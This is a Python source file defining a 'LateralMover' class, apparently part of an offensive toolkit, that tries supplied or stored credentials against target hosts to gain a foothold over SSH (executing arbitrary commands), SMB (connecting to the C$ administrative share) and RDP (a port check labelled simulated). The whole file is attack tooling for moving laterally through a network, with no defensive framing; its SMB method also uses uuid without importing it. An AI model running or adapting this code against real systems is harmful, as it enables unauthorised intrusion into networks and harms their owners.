import logging
import socket
import paramiko
from smbprotocol.connection import Connection
from smbprotocol.session import Session
from smbprotocol.tree import TreeConnect

logger = logging.getLogger(__name__)

class LateralMover:
    def __init__(self):
        self.credentials_store = {}

    def add_credential(self, target_ip: str, username: str, password: str):
        key = f"{target_ip}:{username}"
        self.credentials_store[key] = password

    def move_ssh(self, target_ip: str, username: str, password: str, command: str = "") -> bool:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, username=username, password=password, timeout=10)
            if command:
                stdin, stdout, stderr = client.exec_command(command)
                output = stdout.read().decode()
                logger.info(f"SSH output: {output[:200]}")
            client.close()
            logger.info(f"SSH lateral move succeeded to {target_ip}")
            return True
        except Exception as e:
            logger.error(f"SSH lateral move failed: {e}")
            return False

    def move_smb(self, target_ip: str, username: str, password: str, share: str = "C$") -> bool:
        try:
            conn = Connection(uuid.uuid4(), target_ip, 445)
            conn.connect()
            session = Session(conn, username, password)
            session.connect()
            tree = TreeConnect(session, f"\\\\{target_ip}\\{share}")
            tree.connect()
            logger.info(f"SMB lateral move succeeded to {target_ip}\\{share}")
            return True
        except Exception as e:
            logger.error(f"SMB lateral move failed: {e}")
            return False

    def move_rdp(self, target_ip: str, username: str, password: str) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, 3389))
            sock.close()
            logger.info(f"RDP port open on {target_ip}, attempting authentication (simulated)")
            return True
        except Exception as e:
            logger.error(f"RDP check failed: {e}")
            return False

    def move_with_creds(self, target_ip: str, username: str, password: str, method: str = "auto") -> bool:
        key = f"{target_ip}:{username}"
        if key in self.credentials_store:
            password = self.credentials_store[key]
        if method == "ssh":
            return self.move_ssh(target_ip, username, password)
        elif method == "smb":
            return self.move_smb(target_ip, username, password)
        elif method == "rdp":
            return self.move_rdp(target_ip, username, password)
        else:
            if self.move_ssh(target_ip, username, password):
                return True
            if self.move_smb(target_ip, username, password):
                return True
            return self.move_rdp(target_ip, username, password)